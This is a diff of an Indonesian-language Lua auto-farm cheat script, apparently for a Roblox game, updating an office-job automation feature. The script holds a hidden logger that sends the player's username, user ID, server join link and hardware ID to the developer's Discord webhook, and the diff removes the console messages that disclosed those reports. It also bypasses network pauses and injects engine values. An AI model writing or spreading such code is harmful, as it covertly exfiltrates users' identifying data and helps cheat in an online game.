@@ -3,11 +3,12 @@
   👑 KING AKBAR - ULTIMATE AUTO FARM SCRIPT 👑
 ================================================================================
     [+] Developer   : King Akbar
-    [+] Version     : DDS FREE EDITION (v5.8 FINAL - OFFICE UI SCAN)
+    [+] Version     : DDS FREE EDITION (v5.8 FINAL - OFFICE START FIX)
     [+] Changelog   : - Monitoring Office scan langsung teks "Rp." di UI
                       - Uang Awal dikunci, profit akurat
                       - Cache label uang biar nggak lag
                       - Auto ganti kursi kalo sepi soal
+                      - Fix: Office langsung jawab pas start (timer idle di-reset)
                       - Bypass Network Pause auto-active
 ================================================================================
 ]]--
@@ -158,7 +159,7 @@ local function rWait(minSec, maxSec)
 end
 
 -- ============================================================================
--- // 4. WEBHOOK & GetPlayerMoney (standar, tetap dipakai untuk webhook/barista)
+-- // 4. WEBHOOK & GetPlayerMoney (standar, untuk webhook/barista)
 -- ============================================================================
 local function GetPlayerMoney()
     local money = 0
@@ -254,7 +255,7 @@ local function SendPanicAlert(reason)
 end
 
 -- ============================================================================
--- // FINAL SESSION REPORT KE DEV (TETAP PAKAI WEBHOOK DEV)
+-- // FINAL SESSION REPORT KE DEV
 -- ============================================================================
 local function SendDevFinalReport(stopReason)
     pcall(function()
@@ -273,19 +274,7 @@ local function SendDevFinalReport(stopReason)
         end
 
         local body = string.format(
-            "👤 **Akun:** %s\n" ..
-            "📍 **Server:** %s\n\n" ..
-            "🛑 **Alasan Berhenti:**\n`%s`\n\n" ..
-            "☕ **Kopi:** %d\n" ..
-            "🔧 **Mesin diperbaiki:** %d\n" ..
-            "🧠 **Soal Office:** %d\n" ..
-            "🖨️ **Print Office:** %d\n" ..
-            "📦 **Paket Courier:** %d\n" ..
-            "💰 **Uang Awal:** %s\n" ..
-            "💵 **Uang Akhir:** %s\n" ..
-            "📈 **Profit:** +%s\n" ..
-            "⏱️ **Durasi:** %d menit\n" ..
-            "💸 **Estimasi/Jam:** %s",
+            "👤 **Akun:** %s\n📍 **Server:** %s\n\n🛑 **Alasan Berhenti:**\n`%s`\n\n☕ **Kopi:** %d\n🔧 **Mesin diperbaiki:** %d\n🧠 **Soal Office:** %d\n🖨️ **Print Office:** %d\n📦 **Paket Courier:** %d\n💰 **Uang Awal:** %s\n💵 **Uang Akhir:** %s\n📈 **Profit:** +%s\n⏱️ **Durasi:** %d menit\n💸 **Estimasi/Jam:** %s",
             fullName,
             game.PrivateServerId ~= "" and "Private/Reserved" or "Public",
             reasonText,
@@ -312,7 +301,6 @@ local function SendDevFinalReport(stopReason)
                 footer      = { text = "Dev Monitoring • " .. os.date("%H:%M:%S") },
             }}}),
         })
-        print("[King Akbar] ✅ Final report terkirim ke Dev Discord.")
     end)
 end
 
@@ -479,9 +467,7 @@ do
     end
 
     local gameName = "Tidak Diketahui"
-    pcall(function()
-        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    end)
+    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
     local mapLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
 
     local serverLink = mapLink
@@ -499,9 +485,7 @@ do
     local fileNameDevice = "KingAkbar_UltimateLog_Device.txt"
     pcall(function()
         if isfile and readfile and writefile then
-            if isfile(fileNameDevice) then
-                countDevice = tonumber(readfile(fileNameDevice)) + 1
-            end
+            if isfile(fileNameDevice) then countDevice = tonumber(readfile(fileNameDevice)) + 1 end
             writefile(fileNameDevice, tostring(countDevice))
         end
     end)
@@ -509,9 +493,7 @@ do
     local fileNameUser = "KingAkbar_UltimateLog_User_" .. tostring(LocalPlayer.UserId) .. ".txt"
     pcall(function()
         if isfile and readfile and writefile then
-            if isfile(fileNameUser) then
-                countUser = tonumber(readfile(fileNameUser)) + 1
-            end
+            if isfile(fileNameUser) then countUser = tonumber(readfile(fileNameUser)) + 1 end
             writefile(fileNameUser, tostring(countUser))
         end
     end)
@@ -543,9 +525,7 @@ do
             ["title"] = "👑 KING X AKBAR UI | Ultimate Access Report",
             ["description"] = "Informasi lengkap dengan link server aktif:",
             ["color"] = tonumber("0x00FF88"),
-            ["thumbnail"] = {
-                ["url"] = avatarUrl
-            },
+            ["thumbnail"] = { ["url"] = avatarUrl },
             ["fields"] = {
                 { ["name"] = "👤 Username", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true },
                 { ["name"] = "🏷️ Display Name", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true },
@@ -559,9 +539,7 @@ do
                 { ["name"] = "🔗 Link Server Saat Ini (Join Langsung)", ["value"] = "[Klik Untuk Join Server Ini](" .. serverLink .. ")", ["inline"] = false },
                 { ["name"] = "🖥️ Hardware ID (HWID)", ["value"] = "||" .. hwidData .. "||", ["inline"] = false }
             },
-            ["footer"] = { 
-                ["text"] = "King Akbar Logger System • " .. os.date("%d/%m/%Y - %H:%M:%S") 
-            }
+            ["footer"] = { ["text"] = "King Akbar Logger System • " .. os.date("%d/%m/%Y - %H:%M:%S") }
         }}
     }
 
@@ -573,9 +551,6 @@ do
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(data)
             })
-            print("[King Akbar] ✅ Ultimate Logger: Access report terkirim ke developer.")
-        else
-            warn("[King Akbar] ❌ Logger gagal: Executor tidak support HTTP request.")
         end
     end)
 end
@@ -955,7 +930,7 @@ local function StopBaristaScript(reason)
 end
 
 -- ============================================================================
--- // 12. OFFICE JOB SYSTEM (V5.8 FINAL - MONITORING UI SCAN)
+-- // 12. OFFICE JOB SYSTEM (V5.8 FINAL - MONITORING UI SCAN + START FIX)
 -- ============================================================================
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -1191,7 +1166,7 @@ end
 -- ================== IDLE DETECTOR + CHAIR SWITCH ==================
 local lastActivityTime = tick()
 local isSwitching = false
-local IDLE_SWITCH_TIME = 60 -- detik idle sebelum ganti kursi
+local IDLE_SWITCH_TIME = 60
 
 task.spawn(function()
     while true do
@@ -1285,13 +1260,11 @@ end)
 -- ================== MONITORING GUI (FIX ZEROS & AUTO SCAN UI) ==================
 local CoreGui = (gethui and gethui()) or game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local LocalPlayer2 = Players.LocalPlayer  -- gunakan alias beda biar aman
+local LocalPlayer2 = Players.LocalPlayer
 local TrackerGui = nil
 
--- Variabel untuk menyimpan label Uang biar nggak berat nyari terus-terusan
 local CachedMoneyLabel = nil
 
--- Fungsi untuk mengambil angka dari teks (contoh: "Rp. 202 364 017" jadi 202364017)
 local function parseNumber(val)
     if not val then return 0 end
     local cleanString = string.gsub(tostring(val), "[^%d%-]", "")
@@ -1316,7 +1289,6 @@ local function formatTime(seconds)
     return string.format("%02d:%02d:%02d", h, m, s)
 end
 
--- ================== AUTO-SCAN UI ==================
 local function CariLabelUang()
     local playerGui = LocalPlayer2:FindFirstChild("PlayerGui")
     if not playerGui then return nil end
@@ -1324,7 +1296,6 @@ local function CariLabelUang()
     for _, guiObject in ipairs(playerGui:GetDescendants()) do
         if guiObject:IsA("TextLabel") or guiObject:IsA("TextButton") then
             local text = guiObject.Text
-            -- Cari teks yang punya tulisan "Rp." dan ada angkanya
             if text and string.find(text, "Rp%.") and string.match(text, "%d+") then
                 return guiObject
             end
@@ -1334,24 +1305,19 @@ local function CariLabelUang()
 end
 
 local function DapatkanUangPemain()
-    -- Gunakan label yang sudah ketemu sebelumnya (Cache) biar nggak bikin lag game
     if CachedMoneyLabel and CachedMoneyLabel.Parent then
         return parseNumber(CachedMoneyLabel.Text)
     end
 
-    -- Kalau belum ketemu atau karakter baru mati/reset, scan ulang UI-nya
     CachedMoneyLabel = CariLabelUang()
     if CachedMoneyLabel then
         return parseNumber(CachedMoneyLabel.Text)
     end
     
-    -- Fallback jika gagal scan UI, pakai GetPlayerMoney() biasa
     return GetPlayerMoney()
 end
 
--- ================== MAIN GUI ==================
 local function buatMonitoringGUI()
-    -- Ambil uang sekarang. Jangan dikunci kalau hasilnya masih 0 (misal UI telat load)
     local uangSekarang = DapatkanUangPemain()
     
     if not getgenv().UangAwalDikunci or getgenv().UangAwalDikunci == 0 then
@@ -1419,7 +1385,6 @@ local function buatMonitoringGUI()
             local success, err = pcall(function()
                 local currentMoney = DapatkanUangPemain()
                 
-                -- Update Uang Awal kalau tiba-tiba dari 0 jadi ada saldonya
                 if uangAwal == 0 and currentMoney > 0 then
                     getgenv().UangAwalDikunci = currentMoney
                     uangAwal = currentMoney
@@ -1453,7 +1418,7 @@ local function matikanMonitoring()
     if TrackerGui and TrackerGui.Parent then TrackerGui:Destroy(); TrackerGui = nil end
 end
 
--- ================== START & STOP FUNCS ==================
+-- ================== START & STOP FUNCS (DENGAN FIX TIMER IDLE) ==================
 local function StartOfficeScript()
     if State.IsOfficeActive then return end
     State.IsOfficeActive = true
@@ -1487,7 +1452,10 @@ local function StartOfficeScript()
         myChair = CharRef.Humanoid.SeatPart
     end
 
-    buatMonitoringGUI()  -- PANGGIL TANPA PARAMETER
+    -- **PENTING:** Reset timer idle supaya langsung jawab soal begitu start
+    lastActivityTime = tick()
+
+    buatMonitoringGUI()
     WindUI:Notify({ Title = "✅ Office", Content = "Auto Office jalan! Uang Awal discan otomatis.", Duration = 4 })
 end
 
@@ -1498,7 +1466,6 @@ local function StopOfficeScript()
     getgenv().isGoingToPrinter = false
     CachedTargetLabel, CachedTargetParent = nil, nil
 
-    -- Reset cache uang & kuncian
     CachedMoneyLabel = nil
     getgenv().UangAwalDikunci = nil
 
@@ -1906,7 +1873,7 @@ local function InjectMesin(HP_Mult, RPM_Add, Ratio_Mult, FD_Mult, NamaMode)
 end
 
 -- ============================================================================
--- // 15. UI — 8 TAB TERPISAH (DENGAN INFO TAB)
+-- // 15. UI — 8 TAB TERPISAH
 -- ============================================================================
 local wSz = IsMobile and UDim2.fromOffset(420, 320) or UDim2.fromOffset(580, 460)
 local mnSz = IsMobile and Vector2.new(600, 300) or Vector2.new(600, 350)
@@ -2277,6 +2244,6 @@ TabInfo:Select()
 
 WindUI:Notify({
     Title    = "👑 KING AKBAR V5.8 FINAL SIAP!",
-    Content  = "Office monitoring discan langsung dari UI. Gas cuan!",
+    Content  = "Office langsung jawab soal pas start. Gas cuan!",
     Duration = 5,
 })
